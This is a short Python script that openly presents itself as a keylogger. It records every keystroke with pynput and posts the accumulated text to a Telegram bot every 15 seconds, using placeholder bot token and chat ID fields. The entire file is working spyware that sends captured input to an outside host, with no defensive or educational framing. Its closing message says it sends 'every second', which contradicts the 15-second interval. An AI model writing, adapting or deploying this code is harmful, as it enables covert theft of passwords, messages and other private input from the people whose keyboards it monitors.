from pynput import keyboard
import requests
import threading
import time

# 🔷 Telegram Bot Info
BOT_TOKEN = 'Enter your bot api token'
CHAT_ID = 'Enter your bot chat_ID'
# 🔷 Storage
log = ""
lock = threading.Lock()

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text}
    try:
        r = requests.post(url, data=data)
        if r.status_code != 200:
            print(f"Failed to send: {r.text}")
    except Exception as e:
        print(f"Error sending message: {e}")

def on_press(key):
    global log
    with lock:
        try:
            log += key.char
        except AttributeError:
            if key == key.space:
                log += ' '
            elif key == key.enter:
                log += '\n'
            else:
                log += f'[{key}]'

def report():
    global log
    while True:
        time.sleep(15)
        with lock:
            if log.strip():
                send_to_telegram(log)
                log = ""

# 🔷 Start reporter thread
threading.Thread(target=report, daemon=True).start()

# 🔷 Start keylogger
listener = keyboard.Listener(on_press=on_press)
listener.start()

print("[*] Keylogger started. Logging and sending every second...")
listener.join()
